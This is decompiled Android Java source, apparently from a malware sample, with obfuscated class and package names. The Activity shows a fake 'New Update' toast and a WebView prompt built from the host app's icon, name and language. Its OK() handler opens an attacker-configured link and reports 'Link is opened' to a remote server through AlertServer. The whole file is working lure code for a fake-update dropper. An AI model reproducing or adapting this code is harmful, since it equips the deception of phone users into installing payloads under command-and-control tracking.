/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.Context
 *  android.content.Intent
 *  android.net.Uri
 *  android.os.Bundle
 *  android.view.View
 *  android.webkit.JavascriptInterface
 *  android.webkit.WebView
 *  android.widget.Toast
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.widget.Toast;
import java.util.Locale;
import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
import linker.resourcer.encoder.vyklwirattpkwkqagsbrm;

public class Vavralm
extends Activity {
    private void endme() {
        block4: {
            String string2;
            Toast.makeText((Context)this.getApplicationContext(), (CharSequence)"New Update", (int)1).show();
            String string3 = string2 = vyklwirattpkwkqagsbrm.Read(this.getApplicationContext(), aaskrfyvhoypymnzlskbzwpyr.up_link, "");
            if (!string2.startsWith("http://")) {
                string3 = string2;
                if (!string2.startsWith("https://")) {
                    string3 = "http://" + string2;
                }
            }
            try {
                string2 = new Intent("android.intent.action.VIEW");
                string2.addFlags(0x10000000);
                string2.setData(Uri.parse((String)string3));
                this.startActivity((Intent)string2);
                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(this.getApplicationContext(), "Update", "Link is opened");
            }
            catch (Exception exception) {
                string3 = new Intent("android.intent.action.VIEW", Uri.parse((String)string3));
                if (string3.resolveActivity(this.getPackageManager()) == null) break block4;
                string3.setFlags(0x10000000);
                this.startActivity((Intent)string3);
            }
        }
        this.finish();
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        bundle = new WebView((Context)this);
        this.setContentView((View)bundle);
        bundle.getSettings().setJavaScriptEnabled(true);
        try {
            Object object = this.getApplicationContext();
            Object object2 = ffbrxjknfnpfxahr.getLabelApplication(object);
            String string2 = Locale.getDefault().getLanguage();
            object = ffbrxjknfnpfxahr.loadHtmlFromAssets(this.getApplicationContext(), "up_require.html").replace("[BASE-ICO]", ffbrxjknfnpfxahr.getAppIconAsBase64(object)).replace("[LNG]", string2).replace("App Name", (CharSequence)object2);
            object2 = new WebAppInterface(this, this.getApplicationContext());
            bundle.addJavascriptInterface(object2, "Vlrgnfjo");
            bundle.loadDataWithBaseURL(null, (String)object, "text/html", "UTF-8", null);
        }
        catch (Exception exception) {
            this.endme();
        }
    }

    public class WebAppInterface {
        Context mContext;
        final Vavralm this$0;

        WebAppInterface(Vavralm vavralm, Context context) {
            this.this$0 = vavralm;
            this.mContext = context;
        }

        @JavascriptInterface
        public void OK() {
            block4: {
                String string2;
                String string3 = string2 = vyklwirattpkwkqagsbrm.Read(this.mContext, aaskrfyvhoypymnzlskbzwpyr.up_link, "");
                if (!string2.startsWith("http://")) {
                    string3 = string2;
                    if (!string2.startsWith("https://")) {
                        string3 = "http://" + string2;
                    }
                }
                try {
                    string2 = new Intent("android.intent.action.VIEW");
                    string2.addFlags(0x10000000);
                    string2.setData(Uri.parse((String)string3));
                    this.mContext.startActivity((Intent)string2);
                    lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(this.this$0.getApplicationContext(), "Update", "Link is opened");
                }
                catch (Exception exception) {
                    string3 = new Intent("android.intent.action.VIEW", Uri.parse((String)string3));
                    if (string3.resolveActivity(this.this$0.getPackageManager()) == null) break block4;
                    string3.setFlags(0x10000000);
                    this.this$0.startActivity((Intent)string3);
                }
            }
            this.this$0.finish();
        }
    }
}

